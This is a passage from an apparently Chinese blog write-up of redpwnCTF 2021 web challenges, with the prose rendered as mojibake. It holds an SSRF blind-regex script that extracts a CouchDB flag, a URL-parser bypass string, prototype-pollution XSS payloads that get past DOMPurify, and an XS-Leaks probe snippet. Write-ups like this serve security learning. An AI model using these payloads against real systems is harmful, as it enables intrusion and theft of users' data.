&lt;span style="color:#75715e"># first, make a request to&lt;/span>
&lt;span style="color:#75715e"># /createUser?username=strellicsquad&amp;amp;password=12345&lt;/span>
&lt;span style="color:#111">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;etoanihsrdlucgwyfmpbkvjxqz&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find&amp;#34;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;selector&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;$regex&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">}}})&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://requester.mc.ax/testAPI/?url=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;amp;method=POST&amp;amp;data=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">alphabet&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.*&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;found &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> -&amp;gt; &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#d88200">}{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥æ‹¿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&lt;/p>
&lt;p>â€”â€”â€”â€”æœ€æ‚²å‚¬çš„èŽ«è¿‡äºŽä¹‹åŽæˆ‘ä¹Ÿç”¨dockeråœ¨æœ¬åœ°èµ·äº†ä¸€ä¸ªçŽ¯å¢ƒ ä½†æ˜¯åˆå§‹åŒ–æœ‰é—®é¢˜ï¼Œå¯¼è‡´localhost:5984æ— æ³•è®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png" alt="image-20210720093017634">&lt;/p>
&lt;p>æˆ‘æœäº†ä¸€ä¸‹ æœ‰ç›¸å…³é—®é¢˜çš„è§£ç­” ä½†éƒ½ä¸æ˜Žç¡®â€¦â€¦&lt;/p>
&lt;p>ä»Žè¿™ä¸ªæŠ¥é”™çœ‹ åº”è¯¥æ˜¯è¯´é¢˜ç›®ç›¸å…³çš„éœ€è¦çš„database_does_not_existï¼Œä½†æ˜¯ç”¨äºŽåˆå§‹åŒ–çš„/_utilsä¹Ÿæ— æ³•è®¿é—®ï¼Œç›´æŽ¥&lt;code>curl 127.0.0.1:5984&lt;/code>ä¹Ÿæ˜¯å¤±è´¥ï¼Œ&lt;code>curl couchdb:5984&lt;/code>ä¹Ÿæ˜¯å¤±è´¥ï¼Œå¤„ç†æŠ¥é”™çœŸæ˜¯å¿ƒç´¯&lt;/p>
&lt;h2 id="webrequester-strikes-back">web/requester-strikes-back&lt;/h2>
&lt;blockquote>
&lt;p>Java was found to not be the future. Can you take down requester again?&lt;/p>
&lt;/blockquote>
&lt;p>æºç å¤„æœ‰ä¸€å¤„ä¿®æ”¹&lt;code>if (urlURI.getHost().toLowerCase().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>&lt;/p>
&lt;p>è¿™ä½¿å¾—æˆ‘ä»¬ä¸èƒ½ç”¨ä¹‹å‰çš„Couchdbå¤§å†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä½†æ˜¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png" alt="image-20210806155508706">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png" alt="image-20210806155558838">&lt;/p>
&lt;p>ç»“åˆ&lt;a href="https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E">Incorrect handling of malformed authority component by URIUtils#extractHost&lt;/a>&lt;/p>
&lt;p>æˆ‘ä»¬åªéœ€è¦æŠŠä¹‹å‰çš„urlæ”¹æˆ&lt;code>http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find&lt;/code>å³å¯ï¼ˆè§£æ³•äºŒï¼‰&lt;/p>
&lt;p>è§£æ³•ä¸€ç›´æŽ¥è·‘å°±è¡Œ ä¸€æ ·èƒ½é€š&lt;/p>
&lt;p>ç›¸å…³çš„ä¸€äº›ssrfå‰ç½®çŸ¥è¯†&amp;amp;urlè§£æžé—®é¢˜ä»ç„¶å¯ä»¥çœ‹è¿™é‡Œï¼š&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ðŸŠOrange Tsai&lt;/a>ï¼ˆå¥½åŽ‰å®³çš„pptï¼‰&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back">wp2&lt;/a>&lt;/p>
&lt;h2 id="webpastebin-1">web/pastebin-1&lt;/h2>
&lt;blockquote>
&lt;p>Ah, the classic pastebin.&lt;/p>
&lt;p>&lt;a href="https://pastebin-1.mc.ax/">pastebin-1.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-1">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs">main.rs&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>pastebinï¼Œç±»ä¼¼ç•™è¨€æ¿çš„æ ·å­ å¯ä»¥å‘è¡¨paste&lt;/p>
&lt;p>ç¬¬ä¸€ååº”å°±æ˜¯xssï¼Œè¯•ä¸€ä¸‹alert(1) æˆåŠŸå¼¹çª—&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png" alt="image-20210710093018218">&lt;/p>
&lt;p>é¢˜ç›®å¦å¤–æä¾›äº†ä¸€ä¸ª/admin-boté¡µé¢ï¼Œ&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png" alt="image-20210710093113748">&lt;/p>
&lt;p>è¿™ä¸ªï¼Œå¦¥å¦¥çš„xsså¥½å§ ç›´æŽ¥xss platformä¸€æŠŠæ¢­ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png" alt="image-20210710094254880">&lt;/p>
&lt;h2 id="webpastebin-2-social-edition">***web/pastebin-2-social-edition&lt;/h2>
&lt;blockquote>
&lt;p>Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.&lt;/p>
&lt;p>&lt;a href="https://pastebin-2-social-edition.mc.ax/">pastebin-2-social-edition.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-2-social-edition">Admin bot&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>è¿™æ¬¡adminbotä¼šç»™è‡ªå·±çš„pasteä¸‹é¢ç•™è¨€å›žå¤&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8Vc6Cyf.png" alt="8Vc6Cyf.png">&lt;/p>
&lt;p>æ˜¾ç„¶å•Š è¿˜æ˜¯xssï¼Œä½†æ˜¯ç”¨äº†DOMPurifyï¼Œå¹¶ä¸”è¿™ä¸ªç‰ˆæœ¬ä¹Ÿå¾ˆæ–° ä¹‹å‰çš„ä¸€äº›bugä¹Ÿæ²¡æ³•åˆ©ç”¨ï¼Œ&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#pastebin-2-social-edition">å‚è€ƒwp&lt;/a>&lt;/p>
&lt;p>çœ‹æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806171955901.png" alt="image-20210806171955901">&lt;/p>
&lt;p>æ³¨æ„åˆ°è¿™é‡Œï¼Œå¦‚æžœæœ‰é”™è¯¯ å°±ä¼šè®¾ç½®&lt;code>errorContainer.innerHTML = message;&lt;/code>ï¼Œå¦‚æžœæˆ‘ä»¬èƒ½æŽ§åˆ¶error message å°±èƒ½åšåˆ°xssäº†ï¼›è¿™é‡Œåˆ©ç”¨åŽŸåž‹æ±¡æŸ“prototype pollutionï¼Œå³ä½¿DOMPurifyå¯ä»¥é˜»æŒ¡ä¸€äº›xsså¸¸ç”¨çš„æ ‡ç­¾æˆ–è€…å±žæ€§ï¼Œä¹Ÿé˜»æ­¢ä¸äº†åŽŸåž‹æ±¡æŸ“&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬å¯ä»¥æŠŠerroræ±¡æŸ“æˆä»»æ„å€¼ï¼Œmessageæ±¡æŸ“ä¸ºxsså†…å®¹å’Œpayload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">{}[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__proto__&amp;#34;&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å½“è¯·æ±‚è¢«è§¦å‘æ—¶ï¼Œerrorå’Œmessageå°±éƒ½æ˜¯æˆ‘ä»¬è‡ªå®šçš„å€¼äº†ï¼›è™½ç„¶DOMPurifyä¼šå¯¹&lt;code>__proto__&lt;/code>è¿›è¡Œç§»é™¤ï¼Œä½†æ˜¯å› ä¸ºä¸Šé¢&lt;code>const fieldsetName = decodeURIComponent(fieldset.name);&lt;/code>ï¼Œæ‰€ä»¥å†å¯¹&lt;code>__proto__&lt;/code>æ¥ä¸€æ‰‹urlencodeå°±èƒ½ç»•è¿‡äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;%255F_proto__&amp;#34;&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;error&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;message&amp;#34;&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;img src=x onerror=&amp;#39;alert(1)&amp;#39;&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;Post Comment&amp;#34;&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#111">/&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">fieldset&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">form&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webpastebin-3">***web/pastebin-3&lt;/h2>
&lt;blockquote>
&lt;p>Boy, there sure are a lot of pastebins. Gotta think of new themes&amp;hellip;&lt;/p>
&lt;p>&lt;em>Please put a reasonably secure password when making an account&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>è¿˜æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„é¡µé¢ create pasteï¼Œå¢žåŠ äº†ä¸€ä¸ªæœç´¢çš„åŠŸèƒ½&lt;/p>
&lt;p>å…ˆçœ‹/viewè·¯ç”±&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png" alt="image-20210808142853227">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png" alt="image-20210808141859178">&lt;/p>
&lt;p>æˆ‘ä»¬çš„ä¾¿ç­¾ æ€»ä½“ä¼šä»¥ä¸€ä¸ªurlçš„å½¢å¼æ”¾å…¥iframeä¸­ï¼ŒæŽ¥ç€åŽ»çœ‹çœ‹sanbox_urlçš„æ¸²æŸ“æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png" alt="image-20210808141709394">&lt;/p>
&lt;p>è€Œäº®ç‚¹æ˜¯ï¼Œæˆ‘ä»¬çš„pasteåˆè¢«ç›´æŽ¥æ”¾å…¥åå¼•å·ä¸­é—´äº†ï¼Œå¦‚æžœæˆ‘ä»¬ç”¨ç±»ä¼¼&lt;code>${alert(1)}&lt;/code>çš„ä¸œè¥¿ç›´æŽ¥å°±å¯ä»¥è·‘jsäº†ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png" alt="image-20210808142359209">&lt;/p>
&lt;p>çŽ°åœ¨æˆ‘ä»¬æœ‰äº†å¯ä»¥æ“ä½œjsä»£ç çš„åœ°æ–¹â€”â€”ä½†æ˜¯è¿™æ˜¯åœ¨sandboxä¸­ï¼Œä¸Žä¸»é¡µé¢å¹¶ä¸æ˜¯åŒæºçš„ðŸ¤”&lt;/p>
&lt;p>å†çœ‹çœ‹æ–°åŠ å…¥çš„searchåŠŸèƒ½&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png" alt="image-20210808143003626">&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™é‡Œè¦å…ˆæ’æ’­ä¸€æ¡çŸ¥è¯†äº† &lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a>ï¼ˆæ›´å¤šçš„ç›¸å…³å‚è€ƒé“¾æŽ¥æ”¾åˆ°åŽé¢äº†ï¼‰ï¼Œä¸€ä¸ªå¸¸è§çš„xsleakæ”»å‡»è¯¦è§&lt;a href="https://xsleaks.dev/docs/attacks/error-events/">error events&lt;/a>&lt;/p>
&lt;p>&lt;em>Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the webâ€™s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. â€”â€”from XSLeaks wiki&lt;/em>&lt;/p>
&lt;p>/searchä½¿ç”¨çš„æ˜¯flaskä¸­çš„flash()æ¶ˆæ¯é—ªçŽ°æ¥å±•ç¤ºæœç´¢çš„ç»“æžœï¼Œå®ƒä¼šå­˜å‚¨åœ¨session cookieä¸­ï¼Œå¦‚æžœæ¶ˆæ¯æ¯”ä¼šè¯cookieå¤§çš„è¯ä¼šå¯¼è‡´æ¶ˆæ¯é—ªçŽ°é™é»˜å¤±è´¥â€”â€”æˆ‘ä»¬åˆ©ç”¨è¿™ä¸€æ¡ç‰¹æ€§ï¼Œç”¨é•¿é•¿çš„cookieï¼Œå¦‚æžœè¯·æ±‚æˆåŠŸ é‚£ä¹ˆéœ€è¦æ˜¾ç¤ºflashæ—¶cookieå°†ä¼šè¶…è¿‡é™åˆ¶æŠ¥é”™ï¼Œè€Œè¯·æ±‚å¤±è´¥ å°±åªæœ‰No results foundçŸ­çŸ­çš„ä¸€æ¡ï¼Œä¸ä¼šæŠ¥400&lt;/p>
&lt;p>æˆ‘ä»¬ç”¨XSLeaks wikiä¸Šç»™å‡ºçš„ probeError snippet&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">probeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">script&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createElement&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;script&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Onload event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">script&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">onerror&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Error event triggered&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
